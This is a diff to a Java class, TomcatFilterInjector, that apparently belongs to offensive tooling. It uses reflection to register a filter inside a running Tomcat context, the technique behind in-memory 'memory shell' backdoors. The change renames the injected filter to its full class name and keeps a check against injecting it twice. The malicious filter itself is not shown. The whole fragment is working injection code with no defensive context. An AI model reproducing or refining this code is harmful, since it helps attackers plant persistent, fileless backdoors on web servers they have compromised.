@@ -207,13 +207,12 @@ public class TomcatFilterInjector {
     public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
         ClassLoader catalinaLoader = getCatalinaLoader();
         String filterClassName = getClassName();
-        String filterName = filter.getClass().getSimpleName();
         Object filterDef;
         Object filterMap;
 
         // 防止重复注入
         try {
-            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
+            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterClassName}) != null) {
                 return;
             }
         } catch (Exception ignored) {
@@ -235,10 +234,10 @@ public class TomcatFilterInjector {
             }
         }
         try {
-            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
             invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
             invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
-            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
             invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
             Constructor<?>[] constructors;
             try {
@@ -259,7 +258,7 @@ public class TomcatFilterInjector {
             constructors[0].setAccessible(true);
             Object filterConfig = constructors[0].newInstance(context, filterDef);
             Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
-            filterConfigs.put(filterName, filterConfig);
+            filterConfigs.put(filterClassName, filterConfig);
         } catch (Exception e) {
             e.printStackTrace();
         }
